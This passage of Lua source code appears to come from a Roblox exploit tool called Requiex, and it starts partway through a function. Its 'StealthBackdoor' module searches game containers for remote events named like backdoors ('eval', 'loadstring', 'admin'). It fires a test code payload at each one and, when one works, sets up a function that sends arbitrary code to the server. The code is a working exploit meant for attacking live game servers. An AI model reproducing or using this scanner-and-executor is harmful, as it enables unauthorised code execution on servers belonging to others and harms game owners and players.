        game:GetService("Lighting"),
        Players.LocalPlayer:FindFirstChild("PlayerGui")
    }
    local keywords = {
        "admin","backdoor","bd","eval","exec","execute","inject",
        "loadstring","console","sudo","cmd","command","op","give",
        "set","kick","ban","teleport","god","remote","handler"
    }
    local blacklist = {
        "__","test","debug","chat","message","update","playerlist",
        "leaderboard","camera","input","render","sound"
    }
    for _, container in ipairs(containers) do
        if container then
            for _, obj in ipairs(container:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    local name = obj.Name:lower():gsub("%s+","")
                    local blocked = false
                    for _, bl in ipairs(blacklist) do if name:find(bl) then blocked = true break end end
                    if not blocked then
                        for _, kw in ipairs(keywords) do
                            if name == kw or name:find(kw) then table.insert(remotes, obj) break end
                        end
                    end
                end
            end
        end
    end
    self.BackdoorObjects = remotes
    Requiex:Log("Found "..#remotes.." suspicious remotes", Colors.SubText)
    return remotes
end

function StealthBackdoor:TestRemote(remote)
    local marker = "RQ_" .. math.random(100,999)
    local code = "local p = Instance.new('Folder', game:GetService('Lighting')); p.Name = '" .. marker .. "'; task.wait(1); p:Destroy()"
    local tests = {
        {k = nil, c = code},
        {k = "eval", c = code},
        {k = "execute", c = code},
        {k = "run", c = code},
        {k = "loadstring", c = code}
    }
    for _, t in ipairs(tests) do
        pcall(function()
            if remote:IsA("RemoteEvent") then
                if t.k then remote:FireServer(t.k, t.c) else remote:FireServer(t.c) end
            else
                if t.k then remote:InvokeServer(t.k, t.c) else remote:InvokeServer(t.c) end
            end
        end)
        task.wait(0.3)
        if game:GetService("Lighting"):FindFirstChild(marker) then
            if not self.FoundCommands[remote] then self.FoundCommands[remote] = {} end
            table.insert(self.FoundCommands[remote], t.k or "__DIRECT__")
            return true, t.k
        end
    end
    return false, nil
end

function StealthBackdoor:ExploitAll()
    local any = false
    self.BestRemote, self.BestKey = nil, nil
    for _, remote in ipairs(self.BackdoorObjects) do
        local ok, key = self:TestRemote(remote)
        if ok then
            any = true
            if not self.BestRemote then
                self.BestRemote = remote
                self.BestKey = key
            end
        end
        task.wait(0.1)
    end
    self.Exploited = any
    if any and self.BestRemote then
        Requiex:Log("Backdoor: "..self.BestRemote.Name.." key="..tostring(self.BestKey), "SUCCESS")
        Requiex._execBackdoor = function(code)
            local r, k = self.BestRemote, self.BestKey
            if not r then return false end
            local ok
            if k then
                if r:IsA("RemoteEvent") then ok = pcall(function() r:FireServer(k, code) end)
                else ok = pcall(function() r:InvokeServer(k, code) end) end
            else
                if r:IsA("RemoteEvent") then ok = pcall(function() r:FireServer(code) end)
                else ok = pcall(function() r:InvokeServer(code) end) end
            end
            Requiex:Log(ok and "Backdoor OK" or "Backdoor fail", ok and "SUCCESS" or "ERROR")
            return ok
        end
        Requiex:SetStatus(Colors.Green)
    else
        Requiex:Log("No backdoor found", "WARN")
    end
    return any
end

function StealthBackdoor:SilentScan()
    Requiex:Log("Scan started...", Colors.AccentYellow)
    self:FindRemotes()
    if #self.BackdoorObjects > 0 then
        self:ExploitAll()
    else
        Requiex:Log("No targets", "WARN")
    end
end

